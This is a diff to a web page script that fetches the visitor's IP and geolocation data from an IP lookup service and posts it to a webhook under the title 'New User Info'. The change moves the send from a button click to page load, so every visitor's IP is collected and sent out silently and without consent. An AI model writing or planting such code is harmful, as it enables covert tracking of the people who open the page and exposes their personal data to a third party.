@@ -3,6 +3,7 @@ async function sendUserIPToWebhook() {
   // Fetching the IP data from the API
   const response = await fetch('https://ipapi.co/json/');
   const data = await response.json();
+
   // Creating the embed for the Webhook with just the IP
   const embed = {
     title: "New User Info",    // Embed title
@@ -29,15 +30,8 @@ async function sendUserIPToWebhook() {
   });
 }
 
-// Wait for the page to load completely
-window.onload = () => {
-  // Select the "Soon" button and add event listener
-  const soonButton = document.querySelector('.btn');  // Query for button
-  if (soonButton) {  // Ensure button is found
-    soonButton.addEventListener('click', async (event) => {
-      // Prevent default button behavior
-      // Call the function to send the IP when the "Soon" button is clicked
-      await sendUserIPToWebhook(); // Verificar si la función se ejecuta correctamente
-    });
-  }
+// Wait for the page to load completely and then send the IP
+window.onload = async () => {
+  // Call the function to send IP as soon as the page loads
+  await sendUserIPToWebhook();// Log to check if the request was successful
 };
